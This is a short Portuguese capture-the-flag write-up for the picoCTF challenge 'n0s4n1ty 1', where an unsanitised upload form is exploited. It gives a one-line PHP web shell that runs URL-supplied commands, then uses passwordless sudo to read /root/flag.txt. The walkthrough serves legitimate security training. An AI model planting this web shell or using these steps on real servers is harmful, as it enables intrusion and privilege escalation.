# n0s4n1ty 1

https://play.picoctf.org/practice/challenge/482?category=1&difficulty=1&originalEvent=74&page=1

Um desafio bem interessante onde temos o upload de arquivo não sanitizado.
![alt text](https://github.com/pleilistt/CTFs/blob/main/images/pico1.png)

Ao realizar um upload, vemos que é usado php para isso.
Logo podemos criar um código php que irá aceitar comandos linux via URL.

```php
<? echo shell_exec($_GET['cmd'].' 2>&1'); ?>
```

desta forma podemos rodar dentro da URL: ?cmd=ls

Ao checar nossas permissões com "sudo -l" vemos que não precisamos de senhas para executar tarefas. Então podemos utilizar dentro da URL:

```
?cmd=sudo cat /root/flag.txt
```
